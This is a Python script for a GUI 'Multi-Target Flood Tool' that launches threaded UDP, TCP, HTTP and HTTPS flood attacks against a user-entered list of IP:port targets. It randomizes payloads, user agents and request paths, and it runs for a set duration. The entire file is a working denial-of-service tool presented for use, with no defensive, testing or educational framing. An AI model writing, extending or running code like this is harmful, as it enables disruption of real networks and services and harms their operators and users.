import socket
import random
import threading
import time
import ssl
from tkinter import *
from tkinter import messagebox, ttk
from colorama import Fore, init

init(autoreset=True)

# --- Core Flood Functions ---
def udp_flood(target_ip, target_port, packet_size, delay, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random.randbytes(packet_size), (target_ip, target_port))
            time.sleep(delay)
        except Exception as e:
            print(f"[UDP Error] {e}")
        finally:
            sock.close()

def tcp_flood(target_ip, target_port, delay, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\nHost: %b\r\n\r\n" % target_ip.encode())
            time.sleep(delay)
            sock.close()
        except Exception as e:
            print(f"[TCP Error] {e}")

def http_flood(target_ip, target_port, use_https, delay, stop_event):
    while not stop_event.is_set():
        try:
            if use_https:
                context = ssl.create_default_context()
                sock = socket.create_connection((target_ip, target_port))
                sock = context.wrap_socket(sock, server_hostname=target_ip)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))

            user_agent = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "AppleWebKit/537.36 (KHTML, like Gecko)",
                "Chrome/91.0.4472.124 Safari/537.36"
            ])

            request = f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n"
            request += f"Host: {target_ip}\r\n"
            request += f"User-Agent: {user_agent}\r\n\r\n"
            sock.send(request.encode())
            time.sleep(delay)
            sock.close()
        except Exception as e:
            print(f"[HTTP/HTTPS Error] {e}")

# --- GUI Application ---
class AttackGUI:
    def __init__(self, master):
        self.master = master
        master.title("Multi-Target Flood Tool")
        master.geometry("600x500")
        master.resizable(False, False)

        self.stop_event = threading.Event()
        self.threads = []

        self.setup_widgets()

    def setup_widgets(self):
        Label(self.master, text="Attack Type:").pack(pady=5)
        self.attack_type = ttk.Combobox(self.master, values=["UDP", "TCP", "HTTP", "HTTPS"])
        self.attack_type.pack()

        Label(self.master, text="Targets (IP:Port per line):").pack(pady=5)
        self.targets_text = Text(self.master, height=6)
        self.targets_text.pack(fill=X, padx=10)

        Label(self.master, text="Duration (seconds):").pack(pady=5)
        self.duration_entry = Entry(self.master)
        self.duration_entry.pack()

        Label(self.master, text="UDP Packet Size (if UDP):").pack(pady=5)
        self.packet_size_entry = Entry(self.master)
        self.packet_size_entry.insert(0, "1024")
        self.packet_size_entry.pack()

        Label(self.master, text="Delay between packets (seconds):").pack(pady=5)
        self.delay_entry = Entry(self.master)
        self.delay_entry.insert(0, "0.1")
        self.delay_entry.pack()

        Button(self.master, text="Start Attack", command=self.start_attack).pack(pady=10)
        Button(self.master, text="Stop Attack", command=self.stop_attack).pack()

        self.progress_label = Label(self.master, text="Idle")
        self.progress_label.pack(pady=10)

    def start_attack(self):
        self.stop_event.clear()
        self.progress_label.config(text="Attack in progress...")

        try:
            duration = int(self.duration_entry.get())
            delay = float(self.delay_entry.get())
            packet_size = int(self.packet_size_entry.get())
            targets = self.targets_text.get("1.0", END).strip().splitlines()
            attack_type = self.attack_type.get().upper()
        except ValueError:
            messagebox.showerror("Error", "Please enter valid inputs.")
            return

        for target in targets:
            try:
                ip, port = target.split(":")
                port = int(port)

                if attack_type == "UDP":
                    t = threading.Thread(target=udp_flood, args=(ip, port, packet_size, delay, self.stop_event))
                elif attack_type == "TCP":
                    t = threading.Thread(target=tcp_flood, args=(ip, port, delay, self.stop_event))
                elif attack_type in ["HTTP", "HTTPS"]:
                    t = threading.Thread(target=http_flood, args=(ip, port, attack_type == "HTTPS", delay, self.stop_event))
                else:
                    messagebox.showerror("Error", "Unknown attack type selected.")
                    return

                t.start()
                self.threads.append(t)
            except Exception as e:
                messagebox.showerror("Error", f"Failed to parse target: {target}\n{e}")

        threading.Thread(target=self.auto_stop, args=(duration,)).start()

    def stop_attack(self):
        self.stop_event.set()
        self.progress_label.config(text="Attack stopped.")

    def auto_stop(self, duration):
        time.sleep(duration)
        self.stop_attack()
        self.progress_label.config(text="Attack finished.")

if __name__ == '__main__':
    root = Tk()
    app = AttackGUI(root)
    root.mainloop()
